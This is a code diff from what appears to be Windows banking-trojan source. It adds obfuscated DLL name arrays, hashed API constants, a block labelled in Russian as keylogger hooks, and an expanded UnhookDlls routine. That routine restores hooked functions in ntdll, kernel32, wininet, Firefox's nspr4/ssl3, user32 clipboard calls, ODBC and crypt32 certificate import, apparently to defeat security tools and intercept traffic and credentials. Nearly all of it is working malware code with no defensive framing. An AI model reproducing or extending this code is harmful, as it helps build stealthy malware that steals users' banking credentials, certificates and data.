@@ -249,8 +249,9 @@ WCHAR winspool_drv[] = {'w','i','n','s','p','o','o','l','.','d','r','v',0};
 WCHAR commdlg32_dll[]= {'c','o','m','d','l','g','3','2','.','d','l','l',0};
 //for sound
 WCHAR winmm_dll[]= {'w','i','n','m','m','.','d','l','l',0};
-//gdi32
-#define C_TEXTOUTA			0x4954ED86
+WCHAR advapi32_dll[]  = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
+WCHAR odbc32_dll[] = {'o','d','b','c','3','2','.','d','l','l',0};
+WCHAR crypt32_dll[]	 = {'c','r','y','p','t','3','2','.','d','l','l',0};
 
 //ieframe_dll
 
@@ -306,12 +307,19 @@ WCHAR winmm_dll[]= {'w','i','n','m','m','.','d','l','l',0};
 #define C_COPYFILEA						0x2EE4F10D				
 #define C_COPYFILEW						0x2EE4F11B				
 #define C_COPYFILEEXW					0x3C4277EE				
+#define C_LOADLIBRARYW					0xC8AC8030
+#define C_LOADLIBRARYEXW				0x20088E7C
+#define C_GETCOMMANDLINEA				0xFB0730C
+#define C_GETCOMMANDLINEW				0xFB0731A
+
+// advapi
+#define C_REGQUERYVALUEEXA				0x1802E7C8
 
 //ws2_32
-#define C_CONNECT						0xEDD8FE8A	
-#define C_SEND							0xE797764						
-#define C_RECV							0xE5971F6							
-#define C_GETHOSTBYNAME					0xF44318C6	
+#define C_CONNECT						0xEDD8FE8A
+#define C_SEND							0xE797764
+#define C_RECV							0xE5971F6
+#define C_GETHOSTBYNAME					0xF44318C6
 
 //wininet
 #define C_INTERNETOPENA					0x8593DD7
@@ -333,12 +341,18 @@ WCHAR winmm_dll[]= {'w','i','n','m','m','.','d','l','l',0};
 #define C_INTERNETCLOSEHANDLE			0x7314FB0C
 #define C_HTTPADDREQUESTHEADERSA		0xB5901061
 #define C_HTTPADDREQUESTHEADERSW		0xB5901077
+#define C_INTERNETWRITEFILE				0x205BD56A
+#define C_HTTPQUERYINFOA				0x2F5CE027
+#define C_HTTPQUERYINFOW				0x2F5CE031
+
 
 //nspr4
 #define C_PRWRITE						0x7EFB3098
 #define C_PRREAD						0xFA583271
 #define C_PRCLOSE						0x3D3AB319
 #define C_PRCONNECT						0xBF667EA2
+#define C_PROPENTCPSOCKET				0xBF667EA2
+
 
 //ssl3
 #define C_SSLIMPORTFDHASH				0xA1C4E024
@@ -361,6 +375,14 @@ WCHAR winmm_dll[]= {'w','i','n','m','m','.','d','l','l',0};
 #define C_EndPaint						0xCB1CC51
 #define C_GetDCEx						0x4891FDD7
 
+#define C_DispatchMessageA				0x4BAED1C8
+#define C_DispatchMessageW				0x4BAED1DE
+#define C_SetFocus						0x6D5F6D57
+#define C_PeekMessageA					0xD7A87C2C
+#define C_PeekMessageW					0xD7A87C3A
+#define C_SetWindowTextW				0x3C29101C
+#define C_GetClipboardData				0x8E7AE818
+
 
 //кейлогеровские хуки
 #define C_PEEKMESSAGEA			0xD7A87C2C
@@ -375,6 +397,14 @@ WCHAR winmm_dll[]= {'w','i','n','m','m','.','d','l','l',0};
 
 //winmm_dll
 #define C_WAVEOUTWRITE			0x1BCB55BB
+
+//odbc_dll
+#define C_SQLDriverConnectA		0x3941DBB7
+#define C_SQLPrepareA			0xC09D6D06
+
+// crypt32_dll
+#define C_PFXImportCertStore	0x3A1B7F5D
+
 
 
 void UnhookDlls()
@@ -396,19 +426,73 @@ void UnhookDlls()
 						  C_SETTHREADCONTEXT, C_CREATEPROCESSA,
 						  C_CREATEPROCESSINTERNALA, C_CREATEPROCESSINTERNALW,
 						  C_CREATEFILEA, C_CREATEFILEW, 
-						  C_COPYFILEA, C_COPYFILEW, C_COPYFILEEXW, 0 };
+						  C_COPYFILEA, C_COPYFILEW, C_COPYFILEEXW, 
+						  C_LOADLIBRARYW, C_LOADLIBRARYEXW, 
+						  C_GETCOMMANDLINEA, C_GETCOMMANDLINEW, 
+						  0 };
+
+	DWORD dwAdvapi[] = { C_REGQUERYVALUEEXA, 
+						  0 };
+
+	DWORD dwUser32[] = {  C_TRANSLATEMESSAGE,C_CREATEWINDOWEXW, C_SHOWWINDOW, C_GETMESSAGEPOS,
+						  C_DIALOGBOX_PARAMW,C_WINDOWFROMPOINT,C_SETWINDOWPOS,C_DRAWTEXTA,
+						  C_DRAWTEXTW,C_DRAWTEXTEXA,C_DRAWTEXTEXW,C_BeginPaint,C_EndPaint,
+						  C_GetDCEx,C_DispatchMessageA,C_DispatchMessageW,C_SetFocus,
+						  C_PeekMessageA,C_PeekMessageW,C_SetWindowTextW,C_GetClipboardData, 
+						  0 };
 
 	DWORD dwWinsock[] = { C_CONNECT, C_SEND, C_RECV, C_GETHOSTBYNAME, 0 };
+
+	DWORD dwOdbc[]    = { C_SQLDriverConnectA, C_SQLPrepareA, 0 };
+
+	DWORD dwCrypt32[] = { C_PFXImportCertStore, 0 };
+
+	DWORD dwNspr4[]	= { C_PRWRITE, C_PRREAD,
+						C_PRCLOSE, C_PRCONNECT,
+						C_PROPENTCPSOCKET, 0 };
+
+	DWORD dwSsl3[]	= { C_SSLIMPORTFDHASH, 0 };
+
+	DWORD dwWininet[] = { C_INTERNETOPENA, C_INTERNETOPENW,
+						  C_INTERNETCONNECTA, C_INTERNETCONNECTW,
+						  C_INTERNETOPENURLA, C_INTERNETOPENURLW,
+						  C_HTTPOPENREQUESTA, C_HTTPOPENREQUESTW,
+						  C_HTTPSENDREQUESTA, C_HTTPSENDREQUESTW,
+						  C_HTTPSENDREQUESTEXA, C_HTTPSENDREQUESTEXW,
+						  C_INTERNETREADFILE, C_INTERNETREADFILEEXA,
+						  C_INTERNETREADFILEEXW, C_INTERNETQUERYDATAVAILABLE,
+						  C_HTTPADDREQUESTHEADERSW, C_HTTPADDREQUESTHEADERSA,
+						  C_INTERNETCLOSEHANDLE, 
+						  C_HTTPADDREQUESTHEADERSA, C_HTTPADDREQUESTHEADERSW,
+						  C_INTERNETWRITEFILE, 
+						  C_HTTPQUERYINFOA, C_HTTPQUERYINFOW,
+						  0 };
 	
+	DWORD dwWinmm[] = {C_WAVEOUTWRITE, 0 };
 
-	RestoreFuncs( ntdll_dll,     dwNtdll,    true );
-	RestoreFuncs( kernel32_dll,  dwKernel,   true );
-	RestoreFuncs( ws2_32_dll,    dwWinsock,  true );
+	DWORD dwGdi32[] ={ C_TEXTOUTA, C_TEXTOUTW,
+					   C_EXTTEXTOUTA,C_EXTTEXTOUTW, 0 };
+
+	DWORD dwWinspool[] ={ C_ENUMPRINTERSA, 0 };
+
+	DWORD dwCommDlg[] ={ C_GETSAVEFILENAMEA, C_GETOPENFILENAMEA, 0 };
 
 
 
-
-	return;
+	RestoreFuncs( ntdll_dll,     dwNtdll,   true );
+	RestoreFuncs( kernel32_dll,  dwKernel,  true );
+	RestoreFuncs( ws2_32_dll,    dwWinsock, true );
+	RestoreFuncs( advapi32_dll,  dwAdvapi,  true );
+	RestoreFuncs( user32_dll,    dwUser32,  true );
+	RestoreFuncs( odbc32_dll,    dwOdbc,    true );
+	RestoreFuncs( crypt32_dll,   dwCrypt32, true );
+	RestoreFuncs( nspr4_dll,     dwNspr4,   false);
+	RestoreFuncs( ssl3_dll,      dwSsl3,    false);
+	RestoreFuncs( wininet_dll,   dwWininet, true );
+	RestoreFuncs( winmm_dll,     dwWinmm,   true );
+	RestoreFuncs( gdi_dll,       dwGdi32,   true );
+	RestoreFuncs( winspool_drv,  dwWinspool,true );
+	RestoreFuncs( commdlg32_dll, dwCommDlg, true );
 }
 
 
